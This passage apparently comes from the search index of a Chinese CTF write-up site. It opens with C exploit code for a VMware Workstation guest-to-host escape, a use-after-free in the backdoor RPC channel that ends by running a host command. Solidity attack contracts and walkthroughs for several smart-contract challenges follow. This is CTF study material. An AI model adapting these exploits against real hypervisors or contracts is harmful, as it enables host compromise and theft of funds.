( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i += 4 ){ channel_recv_data ( tmp . cookie1 , tmp . cookie2 , tmp . num , i , data , res ); } printf ( recv data:%s \\n , data ); channel_recv_finish ( tmp . cookie1 , tmp . cookie2 , tmp . num , res ); if ( ! res ){ printf ( fail to recv finish \\n ); } channel_close ( tmp . cookie1 , tmp . cookie2 , tmp . num , res ); if ( ! res ){ printf ( fail to close channel \\n ); return ; } } void leak (){ struct channel chan [ 10 ]; int res = 0 ; int len , i ; char pay [ 8192 ]; char * s1 = info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ; char * data ; char * s2 = info-get guestinfo.a ; char * s3 = 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ; char * s4 = tools.capability.dnd_version 4 ; char * s5 = vmx.capability.dnd_version ; //init data run_cmd ( s1 ); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100); run_cmd ( s4 ); //first step channel_open ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), s2 , res ); channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i ++ ){ channel_recv_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , i , data , res ); } printf ( recv data:%s \\n , data ); //second step free the reply and let the other channel get it. channel_open ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , strlen ( s2 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , strlen ( s2 ) - 4 , s2 , res ); if ( ! res ){ printf ( fail to send data \\n ); return ; } //free the output buffer printf ( Freeing the buffer....,bp:0x5555556DD3EF \\n ); getchar (); channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish1 \\n ); return ; } //finished sending the command, should get the freed buffer printf ( Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC \\n ); getchar (); channel_send_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , 4 , s2 [ 16 ], res ); if ( ! res ){ printf ( fail to send data \\n ); return ; } //third step,free it again //set status to be 4 channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); //free the output buffer printf ( Free the buffer again... \\n ); getchar (); channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish2 \\n ); return ; } printf ( Trying to reuse the buffer as a struct, which we can leak.. \\n ); getchar (); run_cmd ( s5 ); printf ( Should be done.Check the buffer \\n ); getchar (); //Now the output buffer of chan[1] is used as a struct, which contains many addresses channel_recv_reply_len ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i += 4 ){ channel_recv_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , i , data , res ); } printf ( recv data: \\n ); for ( i = 0 ; i len ; i += 8 ){ printf ( recv data:%lx \\n , * ( long long * ) data [ i ]); } text = ( * ( uint64_t * ) data ) - 0xf818d0 ; printf ( Leak Success \\n ); } void exploit (){ //the exploit step is almost the same as the leak ones struct channel chan [ 10 ]; int res = 0 ; int len , i ; char * data ; char * s1 = info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB ; char * s2 = info-get guestinfo.b ; char * s3 = 1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB ; char * s4 = gnome-calculator \\x00 ; uint64_t pay1 = text + 0xFE95B8 ; uint64_t pay2 = text + 0xECFD0 ; //system uint64_t pay3 = text + 0xFE95C8 ; char * pay4 = gnome-calculator \\x00 ; run_cmd ( s1 ); channel_open ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), s2 , res ); channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i += 4 ){ channel_recv_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , i , data , res ); } printf ( recv data:%s \\n , data ); channel_open ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_open ( chan [ 2 ]. cookie1 , chan [ 2 ]. cookie2 , chan [ 2 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_open ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish2 \\n ); return ; } channel_set_len ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , strlen ( s3 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } printf ( leak2 success \\n ); channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish2 \\n ); return ; } channel_send_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , 8 , pay1 , res ); channel_set_len ( chan [ 2 ]. cookie1 , chan [ 2 ]. cookie2 , chan [ 2 ]. num , strlen ( s3 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_set_len ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , strlen ( s3 ), res ); channel_send_data ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , 8 , pay2 , res ); channel_send_data ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , 8 , pay3 , res ); channel_send_data ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , strlen ( pay4 ) + 1 , pay4 , res ); run_cmd ( s4 ); if ( ! res ){ printf ( fail to set len \\n ); return ; } } void main (){ setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stderr , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 2 , 0 ); leak (); printf ( text base :%p , text ); exploit (); } Enjoy your calculator:)","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"backup/realworldctf_2018_stationescape/#_4","text":"\u8c03\u8bd5\u6709\u70b9\u5c0f\u6280\u5de7\u9700\u8981\u8bf4\u660e\u4e00\u4e0b\u3002\u9996\u5148\u5c31\u662f\u6b63\u5e38\u7684\u628a vmware \u5f00\u8d77\u6765\uff0c\u7136\u540e\u5728 host \u7528 gdb \u6765 attach \u4e0a\u53bb\u3002\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u4f1a\u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u7ee7\u7eed\u8fd0\u884c\uff0c\u8fdb\u5165\u865a\u62df\u673a guest \u91cc\u9762\u8dd1 exploit \u811a\u672c\u3002\u4f46\u5927\u5bb6\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u8fd8\u5728 guest \u91cc\u9762\u7684\u65f6\u5019\uff0c host \u7684 gdb \u9047\u5230\u4e86\u65ad\u70b9\uff0c\u4f1a\u600e\u6837\uff1f \u56e0\u4e3a gdb \u9047\u5230\u4e86\u65ad\u70b9\uff0c\u90a3\u4e48 guest \u5c31\u88ab\u505c\u4f4f\u4e86\u3002\u7136\u800c\u4f60\u8fd8\u5728 guest \u91cc\u9762\uff0c\u4f60\u5c31\u6ca1\u6709\u529e\u6cd5\u6309 ctrl+alt \u5207\u51fa\u6765\u4e86\uff0c\u5c31\u50cf\u88ab\u4eba\u653e\u4e86\u4e00\u62db \u65f6\u95f4\u505c\u6b62 \u4e00\u6837\u3002\u8fd9\u4e2a\u65f6\u5019\u4f60\u9664\u4e86\u542b\u6cea\u5f3a\u5236\u5173\u673a\u4e4b\u5916\u6ca1\u6709\u4ec0\u4e48\u597d\u529e\u6cd5\u3002\u6240\u4ee5\u5927\u5bb6\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u8bb0\u5f97\u73b0\u5728exp\u5f00\u5934\u52a0\u4e2a sleep ,\u7136\u540e\u5728 sleep \u7684\u65f6\u5019\u8d76\u7d27\u628a\u9f20\u6807\u5207\u51fa\u6765\u5230 host \u4e2d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6b63\u5e38\u8c03\u8bd5\u4e86\u3002(PS:\u597d\u50cf mac \u4e0d\u4f1a\u6709\u8fd9\u4e2a\u95ee\u9898\uff0c\u56e0\u4e3a mac \u53ef\u4ee5\u76f4\u63a5\u7528\u89e6\u6478\u677f\u5207\u51fa\u6765?)","title":"\u5173\u4e8e\u8c03\u8bd5"},{"location":"backup/realworldctf_2018_stationescape/#_5","text":"\u9898\u76ee\u76f8\u5173\u6750\u6599\uff1a \u9898\u76ee\u64cd\u4f5c\u7cfb\u7edf\uff1aUbuntu x64 1804 \u76ee\u6807VMWare Workstation\uff1aVMware-Workstation-Full-15.0.2-10952284.x86_64.bundle\uff0c https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp patched VMX\uff1a https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E \u4e00\u4e9b\u53c2\u8003\u8d44\u6599\uff1a https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware https://www.52pojie.cn/thread-783225-1-1.html https://sites.google.com/site/chitchatvmback/backdoor","title":"\u76f8\u5173\u6750\u6599"},{"location":"blockchain/bctf2018_fake3d_eosgame/","text":"bctf 2018 blockchain Fake3d \u9898\u76ee\u5730\u5740\uff1a0xd229628fd201a391cf0c4ae6169133c1ed93d00a @ ropsten \u8585\u7f8a\u6bdb\u653b\u51fb\uff1a contract father { function father () payable {} Son son ; function attack ( uint256 times ) public { for ( uint i = 0 ; i times ; i ++ ){ son = new Son (); } } function () payable { } } contract Son { function Son () payable { Fake3D f3d ; f3d = Fake3D ( 0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a ); f3d . airDrop (); if ( f3d . balance ( this ) = 10 ) { f3d . transfer ( 0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f , 10 ); } selfdestruct ( 0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f ); } function () payable { } } \u653b\u51fb\u5b8c\u6210\u540e\uff0c\u63d0\u53d6flag\u65f6\u53d1\u73b0\u4e0d\u5bf9\u52b2\uff0c\u6709\u95ee\u9898\uff0c\u6000\u7591winnerlist\u5408\u7ea6\u4e0d\u5bf9\uff0c\u627e\u5230\u4e86\u8be5\u5408\u7ea6\u771f\u6b63\u7684\u5730\u5740\uff0c\u5e76\u7ee7\u7eed\u9006\u5411\uff1a https://ethervm.io/decompile?address=0xd229628fd201a391cf0c4ae6169133c1ed93d00a network=ropsten \u7b80\u5355\u6765\u8bf4\uff0c\u8fd8\u9700\u8981\u6ee1\u8db3\u7528\u6237\u7684\u5730\u5740\u6700\u540e\u4e3a0x43\u6216\u5012\u65702\u4f4d\u4e3a0xb1. \u7528https://vanity-eth.tk/ \u7206\u7834\uff0c\u5f97\u5230\u5730\u5740\uff0c\u8f6c\u8d26\uff0c\u83b7\u53d6flag\u3002 EOSGAME \u9898\u76ee\u5730\u5740\uff1a0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F @ ropsten \u8d4c\u535a\u6e38\u620f\uff0c\u8d4c\u5c31\u884c\u4e86\uff0c\u5199\u4e2a\u653b\u51fb\u5408\u7ea6\u5728\u4e00\u4e2ablock\u91cc\u9762\u591a\u8d4c\u51e0\u6b21\u300220%\u4e2d100\u500d\u5956\u52b1\uff0c\u5f88\u5212\u7b97 contract EOSGame_exp { EOSGame eosgame ; constructor () public { eosgame = EOSGame ( 0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F ); } function init () public { eosgame . initFund (); } function small ( uint times ) public { for ( uint i = 0 ; i times ; i ++ ) { eosgame . smallBlind (); } } function big ( uint times ) public { for ( uint i = 0 ; i times ; i ++ ) { eosgame . bigBlind (); } } function bof () public view returns ( uint256 ){ return eosgame . eosBlanceOf (); } function flag ( string b64email ) public { eosgame . CaptureTheFlag ( b64email ); } }","title":"BCTF2018 Fake3d&EOSGAME"},{"location":"blockchain/bctf2018_fake3d_eosgame/#bctf-2018-blockchain","text":"","title":"bctf 2018 blockchain"},{"location":"blockchain/bctf2018_fake3d_eosgame/#fake3d","text":"\u9898\u76ee\u5730\u5740\uff1a0xd229628fd201a391cf0c4ae6169133c1ed93d00a @ ropsten \u8585\u7f8a\u6bdb\u653b\u51fb\uff1a contract father { function father () payable {} Son son ; function attack ( uint256 times ) public { for ( uint i = 0 ; i times ; i ++ ){ son = new Son (); } } function () payable { } } contract Son { function Son () payable { Fake3D f3d ; f3d = Fake3D ( 0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a ); f3d . airDrop (); if ( f3d . balance ( this ) = 10 ) { f3d . transfer ( 0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f , 10 ); } selfdestruct ( 0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f ); } function () payable { } } \u653b\u51fb\u5b8c\u6210\u540e\uff0c\u63d0\u53d6flag\u65f6\u53d1\u73b0\u4e0d\u5bf9\u52b2\uff0c\u6709\u95ee\u9898\uff0c\u6000\u7591winnerlist\u5408\u7ea6\u4e0d\u5bf9\uff0c\u627e\u5230\u4e86\u8be5\u5408\u7ea6\u771f\u6b63\u7684\u5730\u5740\uff0c\u5e76\u7ee7\u7eed\u9006\u5411\uff1a https://ethervm.io/decompile?address=0xd229628fd201a391cf0c4ae6169133c1ed93d00a network=ropsten \u7b80\u5355\u6765\u8bf4\uff0c\u8fd8\u9700\u8981\u6ee1\u8db3\u7528\u6237\u7684\u5730\u5740\u6700\u540e\u4e3a0x43\u6216\u5012\u65702\u4f4d\u4e3a0xb1. \u7528https://vanity-eth.tk/ \u7206\u7834\uff0c\u5f97\u5230\u5730\u5740\uff0c\u8f6c\u8d26\uff0c\u83b7\u53d6flag\u3002","title":"Fake3d"},{"location":"blockchain/bctf2018_fake3d_eosgame/#eosgame","text":"\u9898\u76ee\u5730\u5740\uff1a0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F @ ropsten \u8d4c\u535a\u6e38\u620f\uff0c\u8d4c\u5c31\u884c\u4e86\uff0c\u5199\u4e2a\u653b\u51fb\u5408\u7ea6\u5728\u4e00\u4e2ablock\u91cc\u9762\u591a\u8d4c\u51e0\u6b21\u300220%\u4e2d100\u500d\u5956\u52b1\uff0c\u5f88\u5212\u7b97 contract EOSGame_exp { EOSGame eosgame ; constructor () public { eosgame = EOSGame ( 0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F ); } function init () public { eosgame . initFund (); } function small ( uint times ) public { for ( uint i = 0 ; i times ; i ++ ) { eosgame . smallBlind (); } } function big ( uint times ) public { for ( uint i = 0 ; i times ; i ++ ) { eosgame . bigBlind (); } } function bof () public view returns ( uint256 ){ return eosgame . eosBlanceOf (); } function flag ( string b64email ) public { eosgame . CaptureTheFlag ( b64email ); } }","title":"EOSGAME"},{"location":"blockchain/byte2019_bet_hf/","text":"ByteCTF 2019 bet hf bet\u9898\u76ee\u548cexp hf\u9898\u76ee\u548cexp bet \u672c\u9898\u76ee\u662f\u4e00\u4e2a\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u9898\u76ee \u9996\u5148\u9700\u8981\u8fdb\u884cevm\u7684\u9006\u5411\uff0c\u9006\u5411\u51fa\u6574\u4f53\u7a0b\u5e8f\u529f\u80fd \u9996\u5148\u6211\u4eec\u60f3\u8981payforflag\uff0c\u9700\u8981\u670910w\u4f59\u989d function payforflag ( string b64email ) public { require ( balanceOf [ msg . sender ] = 100000 ); emit SendFlag ( b64email ); } \u53ef\u4ee5\u9006\u5411\u51fa\u4e00\u4e2a\u5b58\u94b1\u51fd\u6570\u548c\u4e00\u4e2a\u7a7a\u6295\u51fd\u6570 function deposit () payable { uint geteth = msg . value / 1000000000000000000 ; balanceOf [ msg . sender ] += geteth ; } function profit () { require ( gift [ msg . sender ] == 0 ); gift [ msg . sender ] = 1 ; balanceOf [ msg . sender ] += 1 ; } \u8fd8\u6709\u4e00\u4e2abetgame function betgame ( uint secretguess ){ require ( balanceOf [ msg . sender ] 0 ); balanceOf [ msg . sender ] -= 1 ; if ( secretguess == secret ) { balanceOf [ msg . sender ] += 2 ; isbet [ msg . sender ] = 1 ; } } \u53ea\u8981\u80fd\u591f\u731c\u5bf9secret \u6211\u4eec\u5c31\u53ef\u4ee5\u75281\u4e2atoken bet\u51fa\u67652\u4e2atoken Secret\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bfb\u53d6\u94fe\u4e0a\u4fe1\u606f\u83b7\u5f97\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u6f0f\u6d1e\u8fdb\u884c\u4fee\u6539 function Bet () public { owner = msg . sender ; } \u8fd9\u91cc\u5b58\u5728\u6784\u9020\u51fd\u6570\u5931\u63a7\u95ee\u9898\uff0c\u901a\u8fc7\u6267\u884cBet\u65b9\u6cd5\u53ef\u4ee5\u4fee\u6539owner \u4fee\u6539owner\u540e\u53ef\u4ee5\u6267\u884cset secret\u65b9\u6cd5 function setsecret ( uint secretrcv ) only_owner { secret = secretrcv ; } \u7136\u540e\u6211\u4eec\u4f7f\u7528profit\u53ef\u4ee5\u83b7\u5f971\u4e2atoken \u63a5\u4e0b\u6765\u6267\u884cbetgame\u65b9\u6cd5\uff0c\u53ef\u4ee5\u83b7\u5f97\u4e24\u4e2atoken \u5e76\u4e14\u628amsgsender\u7684isbet\u6807\u5fd7\u4f4d\u53d8\u4e3a1 \u56e0\u4e3a\u6211\u4eec\u5df2\u7ecf\u662fowner\u4e86 \u6240\u4ee5\u53ef\u4ee5\u6267\u884cdoublebetgame\u65b9\u6cd5\uff0c\u5728\u8fd9\u91cc\u5982\u679c\u6211\u4eec\u53ea\u67091\u4e2atoken\u7684\u8bdd\uff0c\u53ef\u4ee5\u901a\u8fc7\u6545\u610fbet\u5931\u8d25\u7684\u65b9\u5f0f\uff0c\u5b9e\u73b0\u6574\u5f62\u6ea2\u51fa function doublebetgame ( uint secretguess ) only_owner { require ( balanceOf [ msg . sender ] - 2 0 ); require ( isbet [ msg . sender ] == 1 ); balanceOf [ msg . sender ] -= 2 ; if ( secretguess == secret ) { balanceOf [ msg . sender ] += 2 ; } } \u4f46\u662f\u56e0\u4e3aisbet\u6807\u5fd7\u4f4d\u7684\u95ee\u9898\uff0c\u6211\u4eec\u73b0\u5728\u6709\u4e24\u4e2atoken\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u6267\u884c\u4e00\u6b21betgame\u5e76\u6545\u610f\u8f93\u63891\u4e2atoken\uff0c\u8ba9\u6211\u4eec\u7684token\u6570\u91cf\u4fdd\u6301\u57281\u4ece\u800c\u6267\u884cdoublebetgame\u5b9e\u73b0\u6ea2\u51fa\u3002\u6700\u540epayforflag hf \u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u9898\u76ee\uff0c\u9996\u5148\u9700\u8981\u5bf9evm\u8fdb\u884c\u9006\u5411\u3002 \u76ee\u6807\u662f\u6267\u884cpayforflag\u3002 \u9996\u5148\u6709\u4e00\u4e2a\u7a7a\u6295\u51fd\u6570\uff1a function profit () public { require ( gift [ msg . sender ] == 0 ); gift [ msg . sender ] = 1 ; balanceOf [ msg . sender ] += 1 ; } \u7136\u540e\u6211\u4eec\u5411\u5408\u7ea6\u7684\u8f6c\u8d26\u4f1a\u53d8\u6210\u6211\u4eec\u7684\u4f59\u989d function hfvote () public payable { uint geteth = msg . value / 1000000000000000000 ; balanceOf [ msg . sender ] += geteth ; } \u6f0f\u6d1e\u5728ubw\u51fd\u6570\u4e2d\uff1a function ubw () public payable { if ( msg . value 2 ether ) { node storage n = node0 ; n . nodeadress = msg . sender ; n . nodenumber = 1 ; } else { n . nodeadress = msg . sender ; n . nodenumber = 2 ; } } \u51fd\u6570\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u5206\u652f\u4e0d\u5b58\u5728\u521d\u59cb\u5316\uff0cn\u5728\u6267\u884c\u7684\u65f6\u5019\u4f1a\u5f62\u6210\u672a\u521d\u59cb\u5316\u6f0f\u6d1e\uff0c\u90a3\u4e48\u53ea\u8981\u6211\u4eec\u8fdb\u5165\u7b2c\u4e8c\u4e2a\u5206\u652f\u5c31\u4f1a\u4fee\u6539storage\u4e2d\u7684\u7b2c\u4e00\u4e2a\u503c\u4e3a\u6211\u4eec\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u503c\u4e3a2 address secret ; uint count ; address owner ; \u7b2c\u4e00\u4e2a\u503c\u4e3asecret \u56e0\u6b64\u901a\u8fc7\u672a\u521d\u59cb\u5316\u6f0f\u6d1e\u6211\u4eec\u53ef\u4ee5\u6267\u884conlySecret\u4fee\u9970\u7684 fate\u51fd\u6570\uff0cfate\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u5f62\u6ea2\u51fa\u6f0f\u6d1e require ( balanceOf [ msg . sender ] - value = 0 ); balanceOf [ msg . sender ] -= value ; balanceOf [ to ] += value ; \u901a\u8fc7\u6574\u5f62\u6ea2\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u5927\u91cf\u4f59\u989d\uff0c\u7136\u540epayforflag\u5373\u53ef\u83b7\u5f97flag\uff1a function payforflag ( string b64email ) public { require ( balanceOf [ msg . sender ] = 100000 ); balanceOf [ msg . sender ] = 0 ; owner . transfer ( address ( this ). balance ); emit SendFlag ( b64email ); }","title":"ByteCTF 2019 bet&hf"},{"location":"blockchain/byte2019_bet_hf/#bytectf-2019-bet-hf","text":"bet\u9898\u76ee\u548cexp hf\u9898\u76ee\u548cexp","title":"ByteCTF 2019 bet &amp; hf"},{"location":"blockchain/byte2019_bet_hf/#bet","text":"\u672c\u9898\u76ee\u662f\u4e00\u4e2a\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u9898\u76ee \u9996\u5148\u9700\u8981\u8fdb\u884cevm\u7684\u9006\u5411\uff0c\u9006\u5411\u51fa\u6574\u4f53\u7a0b\u5e8f\u529f\u80fd \u9996\u5148\u6211\u4eec\u60f3\u8981payforflag\uff0c\u9700\u8981\u670910w\u4f59\u989d function payforflag ( string b64email ) public { require ( balanceOf [ msg . sender ] = 100000 ); emit SendFlag ( b64email ); } \u53ef\u4ee5\u9006\u5411\u51fa\u4e00\u4e2a\u5b58\u94b1\u51fd\u6570\u548c\u4e00\u4e2a\u7a7a\u6295\u51fd\u6570 function deposit () payable { uint geteth = msg . value / 1000000000000000000 ; balanceOf [ msg . sender ] += geteth ; } function profit () { require ( gift [ msg . sender ] == 0 ); gift [ msg . sender ] = 1 ; balanceOf [ msg . sender ] += 1 ; } \u8fd8\u6709\u4e00\u4e2abetgame function betgame ( uint secretguess ){ require ( balanceOf [ msg . sender ] 0 ); balanceOf [ msg . sender ] -= 1 ; if ( secretguess == secret ) { balanceOf [ msg . sender ] += 2 ; isbet [ msg . sender ] = 1 ; } } \u53ea\u8981\u80fd\u591f\u731c\u5bf9secret \u6211\u4eec\u5c31\u53ef\u4ee5\u75281\u4e2atoken bet\u51fa\u67652\u4e2atoken Secret\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bfb\u53d6\u94fe\u4e0a\u4fe1\u606f\u83b7\u5f97\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u6f0f\u6d1e\u8fdb\u884c\u4fee\u6539 function Bet () public { owner = msg . sender ; } \u8fd9\u91cc\u5b58\u5728\u6784\u9020\u51fd\u6570\u5931\u63a7\u95ee\u9898\uff0c\u901a\u8fc7\u6267\u884cBet\u65b9\u6cd5\u53ef\u4ee5\u4fee\u6539owner \u4fee\u6539owner\u540e\u53ef\u4ee5\u6267\u884cset secret\u65b9\u6cd5 function setsecret ( uint secretrcv ) only_owner { secret = secretrcv ; } \u7136\u540e\u6211\u4eec\u4f7f\u7528profit\u53ef\u4ee5\u83b7\u5f971\u4e2atoken \u63a5\u4e0b\u6765\u6267\u884cbetgame\u65b9\u6cd5\uff0c\u53ef\u4ee5\u83b7\u5f97\u4e24\u4e2atoken \u5e76\u4e14\u628amsgsender\u7684isbet\u6807\u5fd7\u4f4d\u53d8\u4e3a1 \u56e0\u4e3a\u6211\u4eec\u5df2\u7ecf\u662fowner\u4e86 \u6240\u4ee5\u53ef\u4ee5\u6267\u884cdoublebetgame\u65b9\u6cd5\uff0c\u5728\u8fd9\u91cc\u5982\u679c\u6211\u4eec\u53ea\u67091\u4e2atoken\u7684\u8bdd\uff0c\u53ef\u4ee5\u901a\u8fc7\u6545\u610fbet\u5931\u8d25\u7684\u65b9\u5f0f\uff0c\u5b9e\u73b0\u6574\u5f62\u6ea2\u51fa function doublebetgame ( uint secretguess ) only_owner { require ( balanceOf [ msg . sender ] - 2 0 ); require ( isbet [ msg . sender ] == 1 ); balanceOf [ msg . sender ] -= 2 ; if ( secretguess == secret ) { balanceOf [ msg . sender ] += 2 ; } } 